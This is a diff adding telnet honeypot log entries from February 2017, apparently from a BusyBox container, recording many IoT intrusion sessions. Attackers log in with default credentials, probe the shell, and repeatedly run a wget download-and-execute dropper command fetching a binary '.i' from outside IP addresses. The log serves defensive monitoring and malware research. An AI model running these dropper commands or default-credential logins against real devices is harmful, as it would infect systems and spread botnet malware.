@@ -1113,3 +1113,1415 @@ Retrieve files via HTTP or FTP
 
 2017-02-25 22:53:34,882 - __main__ - INFO - Saving file /var with md5sum md5sum: from 186.14.75.97:51046
 2017-02-25 22:53:34,971 - __main__ - INFO - Saving file /var/.i with md5sum 2e9dd2e43e866a26c44ceccc129e0c52 from 186.14.75.97:51046
+2017-02-25 22:56:41,336 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 22:56:49,885 - __main__ - INFO - Opened connection to 58.84.136.116:3140
+2017-02-25 22:57:20,840 - __main__ - INFO - Lost connection to 58.84.136.116:3140
+2017-02-25 22:58:58,988 - __main__ - INFO - Opened connection to 189.25.61.254:58247
+2017-02-25 22:59:30,801 - __main__ - INFO - Lost connection to 189.25.61.254:58247
+2017-02-25 23:04:03,757 - __main__ - INFO - Opened connection to 220.233.182.24:52297
+2017-02-25 23:04:04,568 - __main__ - INFO - 220.233.182.24:52297 logged in as admin-1234
+2017-02-25 23:04:04,762 - __main__ - INFO - 220.233.182.24:52297: 'enable'
+2017-02-25 23:04:04,811 - __main__ - INFO - /bin/sh: enable: not found
+
+2017-02-25 23:04:04,811 - __main__ - INFO - 220.233.182.24:52297: 'shell'
+2017-02-25 23:04:04,812 - __main__ - INFO - 220.233.182.24:52297: 'sh'
+2017-02-25 23:04:05,005 - __main__ - INFO - 220.233.182.24:52297: 'cat /proc/mounts; /bin/busybox PHXQG'
+2017-02-25 23:04:05,074 - __main__ - INFO - 
+tmpfs /var tmpfs rw,nosuid,nodev,noexec,relatime,size=5120k 0 0
+sysfs /sys sysfs rw,nosuid,nodev,noexec,relatime 0 0
+proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
+udev /dev devtmpfs rw,relatime,size=289396k,nr_inodes=72349,mode=755 0 0
+
+2017-02-25 23:04:05,136 - __main__ - INFO - PHXQG: applet not found
+
+2017-02-25 23:04:05,462 - __main__ - INFO - 220.233.182.24:52297: 'cd /var; (cat .s || cp /bin/echo .s); /bin/busybox PHXQG'
+2017-02-25 23:04:05,586 - __main__ - INFO - cat: can't open '.s': No such file or directory
+
+2017-02-25 23:04:05,649 - __main__ - INFO - 
+2017-02-25 23:04:05,707 - __main__ - INFO - PHXQG: applet not found
+
+2017-02-25 23:04:05,900 - __main__ - INFO - 220.233.182.24:52297: 'nc; wget; /bin/busybox PHXQG'
+2017-02-25 23:04:05,960 - __main__ - INFO - BusyBox v1.26.2 (2017-01-12 18:09:33 UTC) multi-call binary.
+
+Usage: wget [-c|--continue] [--spider] [-q|--quiet] [-O|--output-document FILE]
+	[--header 'header: value'] [-Y|--proxy on/off] [-P DIR]
+	[-U|--user-agent AGENT] [-T SEC] URL...
+
+Retrieve files via HTTP or FTP
+
+	--spider	Spider mode - only check file existence
+	-c		Continue retrieval of aborted transfer
+	-q		Quiet
+	-P DIR		Save to DIR (default .)
+	-T SEC		Network read timeout is SEC seconds
+	-O FILE		Save to FILE ('-' for stdout)
+	-U STR		Use STR for User-Agent header
+	-Y on/off	Use proxy
+
+2017-02-25 23:04:06,021 - __main__ - INFO - PHXQG: applet not found
+
+2017-02-25 23:04:06,214 - __main__ - INFO - 220.233.182.24:52297: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-25 23:04:06,215 - __main__ - INFO - ELF          (    ¼ 4   TR   4   	 (   
+2017-02-25 23:04:06,215 - __main__ - INFO - +10 records in
+1+0 records out
+
+2017-02-25 23:04:06,407 - __main__ - INFO - 220.233.182.24:52297: '/bin/busybox PHXQG'
+2017-02-25 23:04:06,467 - __main__ - INFO - PHXQG: applet not found
+
+2017-02-25 23:04:06,638 - __main__ - INFO - 220.233.182.24:52297: 'rm .s; wget http://64.237.249.76:34967/.i; chmod +x .i; ./.i; exit'
+2017-02-25 23:04:06,695 - __main__ - INFO - 
+2017-02-25 23:04:07,944 - __main__ - INFO - Connecting to 64.237.249.76:34967 (64.237.249.76:34967)
+.i                   100% |*******************************| 80144   0:00:00 ETA
+
+
+2017-02-25 23:04:08,003 - __main__ - INFO - 
+2017-02-25 23:04:08,110 - __main__ - INFO - 
+2017-02-25 23:04:08,110 - __main__ - INFO - 220.233.182.24:52297: 'q'
+2017-02-25 23:04:08,168 - __main__ - INFO - /bin/sh: q: not found
+
+2017-02-25 23:05:23,097 - __main__ - INFO - Opened connection to 85.98.43.195:33539
+2017-02-25 23:05:23,961 - __main__ - INFO - 85.98.43.195:33539 logged in as root-666666
+2017-02-25 23:05:24,191 - __main__ - INFO - 85.98.43.195:33539: 'enable'
+2017-02-25 23:05:24,253 - __main__ - INFO - /bin/sh: enable: not found
+
+2017-02-25 23:05:24,253 - __main__ - INFO - 85.98.43.195:33539: 'shell'
+2017-02-25 23:05:24,253 - __main__ - INFO - 85.98.43.195:33539: 'sh'
+2017-02-25 23:05:24,714 - __main__ - INFO - 85.98.43.195:33539: 'cat /proc/mounts; /bin/busybox STROD'
+2017-02-25 23:05:24,774 - __main__ - INFO - 
+tmpfs /var tmpfs rw,nosuid,nodev,noexec,relatime,size=5120k 0 0
+sysfs /sys sysfs rw,nosuid,nodev,noexec,relatime 0 0
+proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
+udev /dev devtmpfs rw,relatime,size=289396k,nr_inodes=72349,mode=755 0 0
+
+2017-02-25 23:05:24,835 - __main__ - INFO - STROD: applet not found
+
+2017-02-25 23:05:25,213 - __main__ - INFO - 85.98.43.195:33539: 'cd /var; (cat .s || cp /bin/echo .s); /bin/busybox STROD'
+2017-02-25 23:05:25,342 - __main__ - INFO - cat: can't open '.s': No such file or directory
+
+2017-02-25 23:05:25,402 - __main__ - INFO - 
+2017-02-25 23:05:25,468 - __main__ - INFO - STROD: applet not found
+
+2017-02-25 23:05:25,737 - __main__ - INFO - 85.98.43.195:33539: 'nc; wget; /bin/busybox STROD'
+2017-02-25 23:05:25,795 - __main__ - INFO - BusyBox v1.26.2 (2017-01-12 18:09:33 UTC) multi-call binary.
+
+Usage: wget [-c|--continue] [--spider] [-q|--quiet] [-O|--output-document FILE]
+	[--header 'header: value'] [-Y|--proxy on/off] [-P DIR]
+	[-U|--user-agent AGENT] [-T SEC] URL...
+
+Retrieve files via HTTP or FTP
+
+	--spider	Spider mode - only check file existence
+	-c		Continue retrieval of aborted transfer
+	-q		Quiet
+	-P DIR		Save to DIR (default .)
+	-T SEC		Network read timeout is SEC seconds
+	-O FILE		Save to FILE ('-' for stdout)
+	-U STR		Use STR for User-Agent header
+	-Y on/off	Use proxy
+
+2017-02-25 23:05:25,853 - __main__ - INFO - STROD: applet not found
+
+2017-02-25 23:05:26,084 - __main__ - INFO - 85.98.43.195:33539: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-25 23:05:26,084 - __main__ - INFO - ELF          (    ¼ 4   TR   4   	 (   
+2017-02-25 23:05:26,085 - __main__ - INFO - +10 records in
+1+0 records out
+
+2017-02-25 23:05:26,312 - __main__ - INFO - 85.98.43.195:33539: '/bin/busybox STROD'
+2017-02-25 23:05:26,370 - __main__ - INFO - STROD: applet not found
+
+2017-02-25 23:05:26,724 - __main__ - INFO - 85.98.43.195:33539: 'rm .s; wget http://125.167.149.156:56480/.i; chmod +x .i; ./.i; exit'
+2017-02-25 23:05:26,784 - __main__ - INFO - 
+2017-02-25 23:05:27,997 - __main__ - INFO - Connecting to 125.167.149.156:56480 (125.167.149.156:56480)
+.i                   100% |*******************************| 80144   0:00:00 ETA
+
+
+2017-02-25 23:05:28,059 - __main__ - INFO - 
+2017-02-25 23:05:28,175 - __main__ - INFO - 
+2017-02-25 23:05:28,175 - __main__ - INFO - 85.98.43.195:33539: 'q'
+2017-02-25 23:05:28,232 - __main__ - INFO - /bin/sh: q: not found
+
+2017-02-25 23:05:45,984 - __main__ - INFO - Lost connection to 220.233.182.24:52297
+2017-02-25 23:07:06,444 - __main__ - INFO - Lost connection to 85.98.43.195:33539
+2017-02-25 23:07:36,741 - __main__ - INFO - Opened connection to 37.78.131.243:32998
+2017-02-25 23:07:37,562 - __main__ - INFO - 37.78.131.243:32998 logged in as 888888-888888
+2017-02-25 23:07:37,807 - __main__ - INFO - 37.78.131.243:32998: 'enable'
+2017-02-25 23:07:37,887 - __main__ - INFO - /bin/sh: enable: not found
+
+2017-02-25 23:07:37,888 - __main__ - INFO - 37.78.131.243:32998: 'shell'
+2017-02-25 23:07:37,888 - __main__ - INFO - 37.78.131.243:32998: 'sh'
+2017-02-25 23:07:38,112 - __main__ - INFO - 37.78.131.243:32998: 'cat /proc/mounts; /bin/busybox LWAFL'
+2017-02-25 23:07:38,173 - __main__ - INFO - 
+tmpfs /var tmpfs rw,nosuid,nodev,noexec,relatime,size=5120k 0 0
+sysfs /sys sysfs rw,nosuid,nodev,noexec,relatime 0 0
+proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
+udev /dev devtmpfs rw,relatime,size=289396k,nr_inodes=72349,mode=755 0 0
+
+2017-02-25 23:07:38,233 - __main__ - INFO - LWAFL: applet not found
+
+2017-02-25 23:07:38,606 - __main__ - INFO - 37.78.131.243:32998: 'cd /var; (cat .s || cp /bin/echo .s); /bin/busybox LWAFL'
+2017-02-25 23:07:38,723 - __main__ - INFO - cat: can't open '.s': No such file or directory
+
+2017-02-25 23:07:38,772 - __main__ - INFO - 
+2017-02-25 23:07:38,837 - __main__ - INFO - LWAFL: applet not found
+
+2017-02-25 23:07:39,062 - __main__ - INFO - 37.78.131.243:32998: 'nc; wget; /bin/busybox LWAFL'
+2017-02-25 23:07:39,185 - __main__ - INFO - BusyBox v1.26.2 (2017-01-12 18:09:33 UTC) multi-call binary.
+
+Usage: wget [-c|--continue] [--spider] [-q|--quiet] [-O|--output-document FILE]
+	[--header 'header: value'] [-Y|--proxy on/off] [-P DIR]
+	[-U|--user-agent AGENT] [-T SEC] URL...
+
+Retrieve files via HTTP or FTP
+
+	--spider	Spider mode - only check file existence
+	-c		Continue retrieval of aborted transfer
+	-q		Quiet
+	-P DIR		Save to DIR (default .)
+	-T SEC		Network read timeout is SEC seconds
+	-O FILE		Save to FILE ('-' for stdout)
+	-U STR		Use STR for User-Agent header
+	-Y on/off	Use proxy
+
+2017-02-25 23:07:39,230 - __main__ - INFO - LWAFL: applet not found
+
+2017-02-25 23:07:39,457 - __main__ - INFO - 37.78.131.243:32998: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-25 23:07:39,457 - __main__ - INFO - ELF          (    ¼ 4   TR   4   	 (   
+2017-02-25 23:07:39,457 - __main__ - INFO - +10 records in
+1+0 records out
+
+2017-02-25 23:07:39,680 - __main__ - INFO - 37.78.131.243:32998: '/bin/busybox LWAFL'
+2017-02-25 23:07:39,739 - __main__ - INFO - LWAFL: applet not found
+
+2017-02-25 23:07:39,945 - __main__ - INFO - 37.78.131.243:32998: 'rm .s; wget http://179.60.112.173:53782/.i; chmod +x .i; ./.i; exit'
+2017-02-25 23:07:40,004 - __main__ - INFO - 
+2017-02-25 23:07:42,316 - __main__ - INFO - Connecting to 179.60.112.173:53782 (179.60.112.173:53782)
+.i                    71% |**********************         | 56940   0:00:00 ETA
+.i                   100% |*******************************| 80144   0:00:00 ETA
+
+
+2017-02-25 23:07:42,362 - __main__ - INFO - 
+2017-02-25 23:07:42,475 - __main__ - INFO - 
+2017-02-25 23:07:42,476 - __main__ - INFO - 37.78.131.243:32998: 'q'
+2017-02-25 23:07:42,534 - __main__ - INFO - /bin/sh: q: not found
+
+2017-02-25 23:08:24,976 - __main__ - INFO - Saving file /var with md5sum md5sum: from 37.78.131.243:32998
+2017-02-25 23:08:25,064 - __main__ - INFO - Saving file /var/.i with md5sum 2e9dd2e43e866a26c44ceccc129e0c52 from 37.78.131.243:32998
+2017-02-25 23:10:02,510 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 23:10:22,255 - __main__ - INFO - Opened connection to 104.7.14.91:35688
+2017-02-25 23:10:24,813 - __main__ - INFO - 104.7.14.91:35688 logged in as root-toor
+2017-02-25 23:10:26,563 - __main__ - INFO - 104.7.14.91:35688: 'rm .s; wget http://179.60.112.173:53782/.i; chmod +x .i; ./.i; exit'
+2017-02-25 23:10:26,621 - __main__ - INFO - rm: can't remove '.s': No such file or directory
+
+2017-02-25 23:10:29,864 - __main__ - INFO - Connecting to 179.60.112.173:53782 (179.60.112.173:53782)
+.i                    16% |*****                          | 13140   0:00:05 ETA
+.i                    83% |*************************      | 67160   0:00:00 ETA
+.i                   100% |*******************************| 80144   0:00:00 ETA
+
+
+2017-02-25 23:10:29,922 - __main__ - INFO - 
+2017-02-25 23:10:30,039 - __main__ - INFO - 
+2017-02-25 23:10:35,704 - __main__ - INFO - 104.7.14.91:35688: 'exit'
+2017-02-25 23:10:35,770 - __main__ - INFO - 
+2017-02-25 23:10:37,955 - __main__ - INFO - 104.7.14.91:35688: 'quit'
+2017-02-25 23:10:38,002 - __main__ - INFO - /bin/sh: quit: not found
+
+2017-02-25 23:10:40,276 - __main__ - INFO - 104.7.14.91:35688: 'quit'
+2017-02-25 23:10:40,342 - __main__ - INFO - /bin/sh: quit: not found
+
+2017-02-25 23:10:43,058 - __main__ - INFO - Lost connection to 104.7.14.91:35688
+2017-02-25 23:13:53,398 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 23:13:58,895 - __main__ - INFO - Opened connection to 104.7.14.91:35690
+2017-02-25 23:14:00,966 - __main__ - INFO - 104.7.14.91:35690 logged in as root-toor
+2017-02-25 23:14:02,481 - __main__ - INFO - 104.7.14.91:35690: 'rm .s; wget http://179.60.112.173:53782/.i; chmod +x .i; ./.i; exit'
+2017-02-25 23:14:02,539 - __main__ - INFO - rm: can't remove '.s': No such file or directory
+
+2017-02-25 23:14:15,351 - __main__ - INFO - Connecting to 179.60.112.173:53782 (179.60.112.173:53782)
+.i                    16% |*****                          | 13140   0:00:05 ETA
+.i                    18% |*****                          | 14600   0:00:08 ETA
+.i                    18% |*****                          | 14600   0:00:13 ETA
+.i                    20% |******                         | 16060   0:00:15 ETA
+.i                    20% |******                         | 16060   0:00:19 ETA
+.i                    30% |*********                      | 24820   0:00:13 ETA
+.i                    41% |************                   | 33580   0:00:09 ETA
+.i                    74% |***********************        | 59860   0:00:02 ETA
+.i                    76% |***********************        | 61320   0:00:02 ETA
+.i                    76% |***********************        | 61320   0:00:03 ETA
+.i                    78% |************************       | 62780   0:00:03 ETA
+.i                    89% |***************************    | 71540   0:00:01 ETA
+.i                   100% |*******************************| 80144   0:00:00 ETA
+
+
+2017-02-25 23:14:15,417 - __main__ - INFO - 
+2017-02-25 23:14:15,527 - __main__ - INFO - 
+2017-02-25 23:14:15,806 - __main__ - INFO - Lost connection to 104.7.14.91:35690
+2017-02-25 23:14:44,008 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 23:14:49,031 - __main__ - INFO - Opened connection to 104.7.14.91:35692
+2017-02-25 23:14:51,866 - __main__ - INFO - 104.7.14.91:35692 logged in as toor-root
+2017-02-25 23:14:54,791 - __main__ - INFO - 104.7.14.91:35692: 'rm .s; wget http://179.60.112.173:53782/.i; chmod +x .i; ./.i; exit'
+2017-02-25 23:14:54,854 - __main__ - INFO - rm: can't remove '.s': No such file or directory
+
+2017-02-25 23:14:57,055 - __main__ - INFO - Connecting to 179.60.112.173:53782 (179.60.112.173:53782)
+.i                    16% |*****                          | 13140   0:00:05 ETA
+.i                   100% |*******************************| 80144   0:00:00 ETA
+
+
+2017-02-25 23:14:57,121 - __main__ - INFO - 
+2017-02-25 23:14:57,239 - __main__ - INFO - 
+2017-02-25 23:15:00,825 - __main__ - INFO - 104.7.14.91:35692: 'eixt'
+2017-02-25 23:15:00,884 - __main__ - INFO - /bin/sh: eixt: not found
+
+2017-02-25 23:15:02,136 - __main__ - INFO - 104.7.14.91:35692: 'quit'
+2017-02-25 23:15:02,197 - __main__ - INFO - /bin/sh: quit: not found
+
+2017-02-25 23:15:02,198 - __main__ - INFO - Lost connection to 104.7.14.91:35692
+2017-02-25 23:15:13,404 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 23:15:15,552 - __main__ - INFO - Opened connection to 104.7.14.91:35694
+2017-02-25 23:15:19,032 - __main__ - INFO - 104.7.14.91:35694 logged in as root-toor
+2017-02-25 23:15:25,017 - __main__ - INFO - 104.7.14.91:35694: 'rm .s; wget http://179.60.112.173:53782/.i; chmod +x .i; ./.i; exit'
+2017-02-25 23:15:25,083 - __main__ - INFO - rm: can't remove '.s': No such file or directory
+
+2017-02-25 23:15:29,970 - __main__ - INFO - Connecting to 179.60.112.173:53782 (179.60.112.173:53782)
+.i                    40% |************                   | 32120   0:00:01 ETA
+.i                    40% |************                   | 32120   0:00:02 ETA
+.i                    83% |*************************      | 67160   0:00:00 ETA
+.i                   100% |*******************************| 80144   0:00:00 ETA
+
+
+2017-02-25 23:15:30,019 - __main__ - INFO - 
+2017-02-25 23:15:30,143 - __main__ - INFO - 
+2017-02-25 23:15:42,427 - __main__ - INFO - Opened connection to 123.201.6.9:50499
+2017-02-25 23:15:43,299 - __main__ - INFO - 123.201.6.9:50499 logged in as root-7ujMko0admin
+2017-02-25 23:15:43,572 - __main__ - INFO - 123.201.6.9:50499: 'enable'
+2017-02-25 23:15:43,631 - __main__ - INFO - /bin/sh: enable: not found
+
+2017-02-25 23:15:43,631 - __main__ - INFO - 123.201.6.9:50499: 'shell'
+2017-02-25 23:15:43,631 - __main__ - INFO - 123.201.6.9:50499: 'sh'
+2017-02-25 23:15:43,917 - __main__ - INFO - 123.201.6.9:50499: 'cat /proc/mounts; /bin/busybox IUKWP'
+2017-02-25 23:15:43,976 - __main__ - INFO - 
+tmpfs /var tmpfs rw,nosuid,nodev,noexec,relatime,size=5120k 0 0
+sysfs /sys sysfs rw,nosuid,nodev,noexec,relatime 0 0
+proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
+udev /dev devtmpfs rw,relatime,size=289396k,nr_inodes=72349,mode=755 0 0
+
+2017-02-25 23:15:44,034 - __main__ - INFO - IUKWP: applet not found
+
+2017-02-25 23:15:44,505 - __main__ - INFO - 123.201.6.9:50499: 'cd /var; (cat .s || cp /bin/echo .s); /bin/busybox IUKWP'
+2017-02-25 23:15:44,627 - __main__ - INFO - cat: can't open '.s': No such file or directory
+
+2017-02-25 23:15:44,684 - __main__ - INFO - 
+2017-02-25 23:15:44,743 - __main__ - INFO - IUKWP: applet not found
+
+2017-02-25 23:15:45,017 - __main__ - INFO - 123.201.6.9:50499: 'nc; wget; /bin/busybox IUKWP'
+2017-02-25 23:15:45,078 - __main__ - INFO - BusyBox v1.26.2 (2017-01-12 18:09:33 UTC) multi-call binary.
+
+Usage: wget [-c|--continue] [--spider] [-q|--quiet] [-O|--output-document FILE]
+	[--header 'header: value'] [-Y|--proxy on/off] [-P DIR]
+	[-U|--user-agent AGENT] [-T SEC] URL...
+
+Retrieve files via HTTP or FTP
+
+	--spider	Spider mode - only check file existence
+	-c		Continue retrieval of aborted transfer
+	-q		Quiet
+	-P DIR		Save to DIR (default .)
+	-T SEC		Network read timeout is SEC seconds
+	-O FILE		Save to FILE ('-' for stdout)
+	-U STR		Use STR for User-Agent header
+	-Y on/off	Use proxy
+
+2017-02-25 23:15:45,130 - __main__ - INFO - IUKWP: applet not found
+
+2017-02-25 23:15:45,407 - __main__ - INFO - 123.201.6.9:50499: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-25 23:15:45,407 - __main__ - INFO - ELF          (    ¼ 4   TR   4   	 (   
+2017-02-25 23:15:45,408 - __main__ - INFO - +10 records in
+1+0 records out
+
+2017-02-25 23:15:45,679 - __main__ - INFO - 123.201.6.9:50499: '/bin/busybox IUKWP'
+2017-02-25 23:15:45,749 - __main__ - INFO - IUKWP: applet not found
+
+2017-02-25 23:15:45,989 - __main__ - INFO - 123.201.6.9:50499: 'rm .s; wget http://123.201.6.9:63166/.i; chmod +x .i; ./.i; exit'
+2017-02-25 23:15:46,051 - __main__ - INFO - 
+2017-02-25 23:15:47,587 - __main__ - INFO - Connecting to 123.201.6.9:63166 (123.201.6.9:63166)
+.i                    34% |**********                     | 27740   0:00:01 ETA
+.i                   100% |*******************************| 80144   0:00:00 ETA
+
+
+2017-02-25 23:15:47,646 - __main__ - INFO - 
+2017-02-25 23:15:47,783 - __main__ - INFO - 
+2017-02-25 23:15:47,784 - __main__ - INFO - 123.201.6.9:50499: 'q'
+2017-02-25 23:15:47,831 - __main__ - INFO - /bin/sh: q: not found
+
+2017-02-25 23:15:59,763 - __main__ - INFO - 104.7.14.91:35694: 'exit'
+2017-02-25 23:15:59,824 - __main__ - INFO - 
+2017-02-25 23:15:59,824 - __main__ - INFO - Lost connection to 104.7.14.91:35694
+2017-02-25 23:16:08,835 - __main__ - INFO - Opened connection to 97.100.144.169:58763
+2017-02-25 23:16:15,819 - __main__ - INFO - Saving file /var with md5sum md5sum: from 123.201.6.9:50499
+2017-02-25 23:16:15,915 - __main__ - INFO - Saving file /var/.i with md5sum 2e9dd2e43e866a26c44ceccc129e0c52 from 123.201.6.9:50499
+2017-02-25 23:18:01,412 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 23:18:04,025 - __main__ - INFO - Opened connection to 104.7.14.91:35764
+2017-02-25 23:18:06,296 - __main__ - INFO - 104.7.14.91:35764 logged in as root-toor
+2017-02-25 23:18:08,006 - __main__ - INFO - 104.7.14.91:35764: 'rm .s; wget http://179.60.112.173:53782/.i; chmod +x .i; ./.i; exit'
+2017-02-25 23:18:08,070 - __main__ - INFO - rm: can't remove '.s': No such file or directory
+
+2017-02-25 23:18:21,967 - __main__ - INFO - Connecting to 179.60.112.173:53782 (179.60.112.173:53782)
+.i                    16% |*****                          | 13140   0:00:05 ETA
+.i                    18% |*****                          | 14600   0:00:08 ETA
+.i                    23% |*******                        | 18980   0:00:09 ETA
+.i                    25% |*******                        | 20440   0:00:11 ETA
+.i                    30% |*********                      | 24820   0:00:11 ETA
+.i                    36% |***********                    | 29200   0:00:10 ETA
+.i                    41% |************                   | 33580   0:00:09 ETA
+.i                    54% |****************               | 43800   0:00:06 ETA
+.i                    65% |********************           | 52560   0:00:04 ETA
+.i                    72% |**********************         | 58400   0:00:03 ETA
+.i                    87% |***************************    | 70080   0:00:01 ETA
+.i                   100% |*******************************| 80144   0:00:00 ETA
+
+
+2017-02-25 23:18:22,014 - __main__ - INFO - 
+2017-02-25 23:18:22,149 - __main__ - INFO - 
+2017-02-25 23:18:26,049 - __main__ - INFO - 104.7.14.91:35764: 'exit'
+2017-02-25 23:18:26,129 - __main__ - INFO - 
+2017-02-25 23:18:26,129 - __main__ - INFO - Lost connection to 104.7.14.91:35764
+2017-02-25 23:18:56,517 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 23:18:58,013 - __main__ - INFO - Opened connection to 104.7.14.91:35774
+2017-02-25 23:18:59,879 - __main__ - INFO - 104.7.14.91:35774 logged in as root-toor
+2017-02-25 23:19:01,224 - __main__ - INFO - 104.7.14.91:35774: 'rm .s; wget http://179.60.112.173:53782/.i; chmod +x .i; ./.i; exit'
+2017-02-25 23:19:01,270 - __main__ - INFO - rm: can't remove '.s': No such file or directory
+
+2017-02-25 23:19:05,180 - __main__ - INFO - Connecting to 179.60.112.173:53782 (179.60.112.173:53782)
+.i                    34% |**********                     | 27740   0:00:01 ETA
+.i                    56% |*****************              | 45260   0:00:01 ETA
+.i                    83% |*************************      | 67160   0:00:00 ETA
+.i                   100% |*******************************| 80144   0:00:00 ETA
+
+
+2017-02-25 23:19:05,240 - __main__ - INFO - 
+2017-02-25 23:19:05,358 - __main__ - INFO - 
+2017-02-25 23:19:07,177 - __main__ - INFO - 104.7.14.91:35774: 'exit'
+2017-02-25 23:19:07,241 - __main__ - INFO - 
+2017-02-25 23:19:07,241 - __main__ - INFO - Lost connection to 104.7.14.91:35774
+2017-02-25 23:19:15,197 - __main__ - INFO - Opened connection to 104.7.14.91:35776
+2017-02-25 23:19:17,244 - __main__ - INFO - 104.7.14.91:35776 logged in as root-toor
+2017-02-25 23:19:19,274 - __main__ - INFO - 104.7.14.91:35776: 'rm .s; wget http://179.60.112.173:53782/.i; chmod +x .i; ./.i; exit'
+2017-02-25 23:19:19,332 - __main__ - INFO - rm: can't remove '.s': No such file or directory
+
+2017-02-25 23:19:23,557 - __main__ - INFO - Connecting to 179.60.112.173:53782 (179.60.112.173:53782)
+.i                    71% |**********************         | 56940   0:00:00 ETA
+.i                    81% |*************************      | 65700   0:00:00 ETA
+.i                    87% |***************************    | 70080   0:00:00 ETA
+.i                   100% |*******************************| 80144   0:00:00 ETA
+
+
+2017-02-25 23:19:23,614 - __main__ - INFO - 
+2017-02-25 23:19:23,731 - __main__ - INFO - 
+2017-02-25 23:19:23,731 - __main__ - INFO - 104.7.14.91:35776: 'ls'
+2017-02-25 23:19:23,778 - __main__ - INFO - bin
+dev
+etc
+home
+proc
+root
+sys
+tmp
+usr
+var
+
+2017-02-25 23:19:25,166 - __main__ - INFO - 104.7.14.91:35776: 'ls -la'
+2017-02-25 23:19:25,226 - __main__ - INFO - total 124
+drwxr-xr-x    1 root     root          4096 Feb 25 23:19 .
+drwxr-xr-x    1 root     root          4096 Feb 25 23:19 ..
+-rwxr-xr-x    1 root     root             0 Feb 25 23:19 .dockerenv
+-rwxr-xr-x    1 root     root         80144 Feb 25 23:19 .i
+drwxr-xr-x    2 root     root         12288 Jan 12 18:10 bin
+drwxr-xr-x    5 root     root           380 Feb 25 23:19 dev
+drwxr-xr-x    1 root     root          4096 Feb 25 23:19 etc
+drwxr-xr-x    2 nobody   nogroup       4096 Jan 12 18:10 home
+dr-xr-xr-x  139 root     root             0 Feb 25 23:19 proc
+drwxr-xr-x    2 root     root          4096 Jan 12 18:10 root
+dr-xr-xr-x   13 root     root             0 Feb 25 23:19 sys
+drwxrwxrwt    2 root     root          4096 Jan 12 18:10 tmp
+drwxr-xr-x    3 root     root          4096 Jan 12 18:10 usr
+drwxr-xr-x    4 root     root          4096 Jan 12 18:10 var
+
+2017-02-25 23:19:27,336 - __main__ - INFO - 104.7.14.91:35776: 'exit'
+2017-02-25 23:19:27,407 - __main__ - INFO - 
+2017-02-25 23:19:27,408 - __main__ - INFO - Lost connection to 104.7.14.91:35776
+2017-02-25 23:19:50,722 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 23:19:53,257 - __main__ - INFO - Opened connection to 104.7.14.91:35778
+2017-02-25 23:19:56,919 - __main__ - INFO - 104.7.14.91:35778 logged in as root-toor
+2017-02-25 23:19:58,700 - __main__ - INFO - 104.7.14.91:35778: 'rm .s; wget http://179.60.112.173:53782/.i; chmod +x .i; ./.i; exit'
+2017-02-25 23:19:58,759 - __main__ - INFO - rm: can't remove '.s': No such file or directory
+
+2017-02-25 23:20:06,149 - __main__ - INFO - Connecting to 179.60.112.173:53782 (179.60.112.173:53782)
+.i                    16% |*****                          | 13140   0:00:05 ETA
+.i                    21% |******                         | 17520   0:00:07 ETA
+.i                    21% |******                         | 17520   0:00:10 ETA
+.i                    21% |******                         | 17520   0:00:14 ETA
+.i                    40% |************                   | 32120   0:00:07 ETA
+.i                    60% |******************             | 48180   0:00:03 ETA
+.i                    89% |***************************    | 71540   0:00:00 ETA
+.i                   100% |*******************************| 80144   0:00:00 ETA
+
+
+2017-02-25 23:20:06,210 - __main__ - INFO - 
+2017-02-25 23:20:06,318 - __main__ - INFO - 
+2017-02-25 23:20:07,618 - __main__ - INFO - 104.7.14.91:35778: 'exit'
+2017-02-25 23:20:07,704 - __main__ - INFO - 
+2017-02-25 23:20:07,704 - __main__ - INFO - Lost connection to 104.7.14.91:35778
+2017-02-25 23:21:17,504 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 23:21:18,752 - __main__ - INFO - Opened connection to 104.7.14.91:35782
+2017-02-25 23:21:21,172 - __main__ - INFO - 104.7.14.91:35782 logged in as root-toor
+2017-02-25 23:22:18,656 - __main__ - INFO - 104.7.14.91:35782: 'rm .s; wget http://179.60.112.173:53782/.i; chmod +x .i; ./.i; exit'
+2017-02-25 23:22:18,714 - __main__ - INFO - rm: can't remove '.s': No such file or directory
+
+2017-02-25 23:22:24,985 - __main__ - INFO - Connecting to 179.60.112.173:53782 (179.60.112.173:53782)
+.i                    16% |*****                          | 13140   0:00:05 ETA
+.i                    54% |****************               | 43800   0:00:01 ETA
+.i                    69% |*********************          | 55480   0:00:01 ETA
+.i                    72% |**********************         | 58400   0:00:01 ETA
+.i                    91% |****************************   | 73000   0:00:00 ETA
+.i                   100% |*******************************| 80144   0:00:00 ETA
+
+
+2017-02-25 23:22:25,044 - __main__ - INFO - 
+2017-02-25 23:22:25,150 - __main__ - INFO - 
+2017-02-25 23:22:25,385 - __main__ - INFO - 104.7.14.91:35782: 'exit'
+2017-02-25 23:22:25,443 - __main__ - INFO - 
+2017-02-25 23:22:25,443 - __main__ - INFO - Lost connection to 104.7.14.91:35782
+2017-02-25 23:24:43,818 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 23:24:46,274 - __main__ - INFO - Opened connection to 104.7.14.91:35914
+2017-02-25 23:24:49,427 - __main__ - INFO - 104.7.14.91:35914 logged in as toor-sl
+2017-02-25 23:25:01,155 - __main__ - INFO - 104.7.14.91:35914: 'rm .s; wget http://179.60.112.173:53782/.i; chmod +x .i; ./.i; exit'
+2017-02-25 23:25:01,271 - __main__ - INFO - rm: can't remove '.s': No such file or directory
+
+2017-02-25 23:25:04,949 - __main__ - INFO - Connecting to 179.60.112.173:53782 (179.60.112.173:53782)
+.i                    25% |*******                        | 20440   0:00:02 ETA
